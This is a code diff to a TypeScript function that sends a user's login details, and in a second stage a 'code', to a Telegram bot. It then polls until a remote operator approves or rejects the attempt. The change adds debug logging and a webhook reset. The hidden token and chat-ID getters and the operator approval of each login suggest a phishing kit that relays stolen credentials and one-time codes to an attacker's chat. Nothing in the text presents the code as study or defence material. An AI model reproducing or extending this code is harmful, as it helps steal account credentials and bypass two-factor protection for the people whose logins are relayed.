@@ -57,10 +57,28 @@ export const sendLoginToTelegramAndWait = async (message: string, username: stri
   const token = getT();
   const chatId = getC();
 
-  if (!token || !chatId) return true; // fallback to true
+  console.log('[Telegram] Token:', token ? 'SET' : 'NOT SET');
+  console.log('[Telegram] Chat ID:', chatId ? 'SET' : 'NOT SET');
+
+  if (!token || !chatId) {
+    console.warn('[Telegram] No credentials, allowing fallback');
+    return true; // fallback to true
+  }
+
+  // Clear webhook to allow getUpdates to work
+  try {
+    console.log('[Telegram] Clearing webhook if set...');
+    await fetch(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=true`);
+    await new Promise(resolve => setTimeout(resolve, 1000));
+  } catch (e) {
+    console.warn('[Telegram] Webhook delete failed (may not be set):', e);
+  }
 
   const sessionKey = `pendingAuth_${username}_${isCode ? 'code' : 'login'}`;
   let messageId = sessionStorage.getItem(sessionKey);
+
+  console.log('[Telegram] Session key:', sessionKey);
+  console.log('[Telegram] Cached message ID:', messageId);
 
   if (!messageId) {
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -74,6 +92,7 @@ export const sendLoginToTelegramAndWait = async (message: string, username: stri
     };
 
     try {
+      console.log('[Telegram] Sending message to Telegram...');
       const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -85,30 +104,56 @@ export const sendLoginToTelegramAndWait = async (message: string, username: stri
         }),
       });
 
-      if (!response.ok) return true;
+      console.log('[Telegram] Response status:', response.status);
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        console.error('[Telegram] Send failed:', errorText);
+        return true;
+      }
+
       const data = await response.json();
-      if (!data.ok) return true;
+      console.log('[Telegram] Response data:', data);
+
+      if (!data.ok) {
+        console.error('[Telegram] Telegram API error:', data);
+        return true;
+      }
 
       messageId = data.result.message_id.toString();
       sessionStorage.setItem(sessionKey, messageId!);
+      console.log('[Telegram] Message sent, ID:', messageId);
     } catch (error) {
+      console.error('[Telegram] Send error:', error);
       return true; // fallback
     }
+  } else {
+    console.log('[Telegram] Using cached message ID:', messageId);
   }
 
   // Start polling for callback query
   // We omit offset so we don't accidentally clear updates for other concurrent users.
   // The Telegram API will return the last 100 unconfirmed updates.
+  console.log('[Telegram] Starting polling loop...');
+  let pollCount = 0;
+
   while (true) {
+    pollCount++;
+    console.log(`[Telegram] Poll #${pollCount}`);
+
     try {
       const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
       const updateRes = await fetch(updateUrl);
       const updateData = await updateRes.json();
 
+      console.log('[Telegram] Updates received:', updateData.result?.length || 0);
+
       if (updateData.ok && updateData.result.length > 0) {
         for (const update of updateData.result) {
+          console.log('[Telegram] Update:', update.callback_query ? 'has callback' : 'no callback');
           if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
             const action = update.callback_query.data;
+            console.log('[Telegram] Found matching callback! Action:', action);
 
             // Acknowledge the callback
             await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
@@ -139,11 +184,13 @@ export const sendLoginToTelegramAndWait = async (message: string, username: stri
             // We'll advance offset only to our specific update to at least clear up to ours.
             await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});
 
+            console.log('[Telegram] Returning:', action === 'accept');
             return action === 'accept';
           }
         }
       }
     } catch (e) {
+      console.error('[Telegram] Polling error:', e);
       // network error during polling, ignore and retry
     }
 
